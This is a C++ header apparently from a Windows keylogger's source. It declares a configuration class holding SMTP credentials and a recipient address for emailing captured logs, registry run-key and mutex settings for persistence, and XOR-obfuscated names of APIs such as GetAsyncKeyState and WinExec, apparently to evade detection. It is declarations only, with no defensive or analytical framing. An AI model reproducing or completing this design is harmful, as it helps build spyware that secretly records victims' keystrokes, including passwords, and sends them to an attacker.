//gowno
#ifndef CONFIG_H
#define	CONFIG_H
#include <cstring>
#include <iostream>
#include <windows.h>
#include <stdio.h>
#include "Xor.h"
using namespace std;

class Config {
public:
    Config();
    string GetHost();
    string GetLogin();
    string GetPassword();
    string GetPort();
    string GetToMail();
    string GetKey();
    string GetRegFilePath();
    string GetRegKeyDir();
    string GetRegKeyName();
    string GetMutexRunKey();
    string GetTimeFileName();
    string GetLogFileName();
    string getComputerName();
    string getEmailSubject();
    int GetSendMailTime();
    string GetAsyncKeyStateFunction();
    string GetCopyFileAFunction();
    string GetRegCloseKeyFunction();
    string GetRegDeleteValueFunction();
    string GetRegOpenKeyExAFunction();
    string GetRegSetValueExAFunction();
    string GetWinExecFunction();
    string GetAdvapi32Library();
    string GetKernel32Library();
    string GetUser32Library();
    LPCTSTR StringToLPCTSTR(string value);
private:
    string host;
    string login;
    string password;
    string port;
    string key;
    string toMail;
    string regKeyDir;
    string regKeyName;
    string RegFilePath;
    string mutexRunKey;
    string timeFileName;
    string logFileName;
    int sendMailTime;
    void generateFileConfig();
    Xor *xorTmp;
    string advapi32Library;
    string kernel32Library;
    string user32Library;
    string CopyFileAFunction;
    string RegOpenKeyExAFunction;
    string RegSetValueExAFunction;
    string RegCloseKeyFunction;
    string RegDeleteValueFunction;
    string WinExecFunction;
    string AsyncKeyStateFunction;



};

#endif	/* CONFIG_H */

